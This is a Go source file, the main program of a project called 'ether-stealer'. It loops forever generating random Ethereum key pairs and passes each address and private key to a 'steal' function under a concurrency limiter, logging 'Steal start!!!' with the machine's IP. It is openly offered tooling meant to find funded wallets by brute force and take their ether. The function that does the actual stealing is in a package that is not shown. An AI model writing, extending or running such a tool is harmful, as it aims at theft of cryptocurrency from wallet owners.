package main

import (
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/hexoul/ether-stealer/crypto"
	"github.com/hexoul/ether-stealer/log"
	"github.com/hexoul/ether-stealer/steal"

	"github.com/korovkin/limiter"
)

var (
	nLimit int
	who    string
)

func init() {
	nLimit = 10
	for _, val := range os.Args {
		arg := strings.Split(val, "=")
		if len(arg) < 2 {
			continue
		} else if arg[0] == "-limiter" {
			if i, err := strconv.Atoi(arg[1]); err == nil {
				nLimit = i
			}
		} else if arg[0] == "-who" {
			who = arg[1]
		}
	}
}

func main() {
	// Starting message
	var ip string
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}
	log.Info("Steal start!!! from ", ip, " ", who)

	limit := limiter.NewConcurrencyLimiter(nLimit)
	// If you want to run finite iterator,
	// 1. Add condition to `for` statement like `for i:=0; i<N`
	// 2. Put `limit.Wait()` after `for` statement
	for {
		pubkey, privkey := crypto.GenerateKeyPair()
		addr := crypto.ToAddressFromPubkey(pubkey)
		limit.Execute(func() { steal.Steal(addr, privkey) })
	}
}
